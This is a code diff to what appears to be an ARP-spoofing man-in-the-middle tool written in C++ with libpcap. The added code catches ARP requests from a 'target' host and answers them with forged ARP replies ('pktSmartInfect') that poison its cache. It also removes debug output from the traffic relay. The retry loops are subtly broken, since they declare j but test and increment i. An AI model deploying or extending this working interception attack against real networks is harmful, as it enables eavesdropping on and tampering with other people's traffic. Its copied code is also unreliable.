@@ -500,6 +500,11 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 		if (ethType == EthHdr::Arp){
 			// @Todo1: capture [sender -> me] ARP request(unicast to me) packet and refresh using single ARP reply packet.
 			// @Todo2: capture [sender -> all] ARP request(broadcast=expired) packet and refresh using lazy or multiple ARP reply packets.
+			// @Todo3: capture [target -> sender or all]
+			/*
+				5 6.758103642 targetMac → senderMac	ARP Who has senderIp? Tell targetIp.
+				6 8.030756996 targetMac → Broadcast	ARP Who has senderIp? Tell targetIp.
+			*/
 			EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
 			for(int i = 0; i < listSize; i++){
 				if (pktEthArp->eth_.smac_ == SenderMacList_.at(i)
@@ -525,7 +530,6 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 
 						if (pktEthArp->eth_.dmac_ == MyMac_){
 							// @Todo1 Not expired: ARP request from sender, unicast to me.
-							printf("\n@@@@@ Todo1 @@@@@\n\n");
 							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
 							if (res != 0) {
 								fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
@@ -537,7 +541,6 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						else{
 							// @Todo2 Expired: ARP request from sender, broadcast.
 							// Send multiple infection packet after target's ARP packet.
-							printf("\n@@@@@ Todo2 @@@@@\n\n");
 							usleep(uLatency);
 							for (int j = 0; i < nRetry; i++){
 								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
@@ -549,7 +552,50 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 							}
 							break;
 						}
+					}
+				}
+				else if (pktEthArp->eth_.smac_ == TargetMacList_.at(i)
+				 && pktEthArp->arp_.op_ == ArpHdr::Request
+				 && pktEthArp->arp_.smac_ == TargetMacList_.at(i)
+				 && pktEthArp->arp_.sip_ == TargetIpList_.at(i)
+				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
+				 && pktEthArp->arp_.tip_ == SenderIpList_.at(i)){
+					if ((pktEthArp->eth_.dmac_ == MyMac_) || pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
+						EthArpPacket pktSmartInfect;
+						pktSmartInfect.eth_.smac_ = MyMac_;
+						pktSmartInfect.eth_.dmac_ = TargetMacList_.at(i);
+						pktSmartInfect.eth_.type_ = htons(EthHdr::Arp);
+						pktSmartInfect.arp_.hrd_ = htons(ArpHdr::ETHER);
+						pktSmartInfect.arp_.pro_ = htons(EthHdr::Ip4);
+						pktSmartInfect.arp_.hln_ = Mac::SIZE;
+						pktSmartInfect.arp_.pln_ = Ip::SIZE;
+						pktSmartInfect.arp_.op_ = htons(ArpHdr::Reply);
+						pktSmartInfect.arp_.smac_ = MyMac_;
+						pktSmartInfect.arp_.sip_ = htonl(SenderIpList_.at(i));
+						pktSmartInfect.arp_.tmac_ = TargetMacList_.at(i);
+						pktSmartInfect.arp_.tip_ = htonl(TargetIpList_.at(i));
 
+						if (pktEthArp->eth_.dmac_ == MyMac_){
+							res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+							if (res != 0) {
+								fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+								pcap_close(handle);
+								return;
+							}
+							break;
+						}
+						else{
+							usleep(uLatency);
+							for (int j = 0; i < nRetry; i++){
+								res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktSmartInfect), header->caplen);
+								if (res != 0) {
+									fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+									pcap_close(handle);
+									return;
+								}
+							}
+							break;
+						}
 					}
 				}
 			}
@@ -577,8 +623,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						pcap_close(handle);
 						return;
 					}
-					printf("relay: sender -> me -> target\nsrcIp=%s\ndstIp=%s\n\n",
-					 std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
+					//printf("relay: sender -> me -> target\nsrcIp=%s\ndstIp=%s\n\n", std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
 					break;
 				}
 		
@@ -597,8 +642,7 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 						pcap_close(handle);
 						return;
 					}
-					printf("relay: target -> me -> sender\nsrcIp=%s\ndstIp=%s\n\n",
-					 std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
+					//printf("relay: target -> me -> sender\nsrcIp=%s\ndstIp=%s\n\n", std::string(Ip(pktSrcIp)).c_str(), std::string(Ip(pktDstIp)).c_str());
 					break;
 				}
 			}
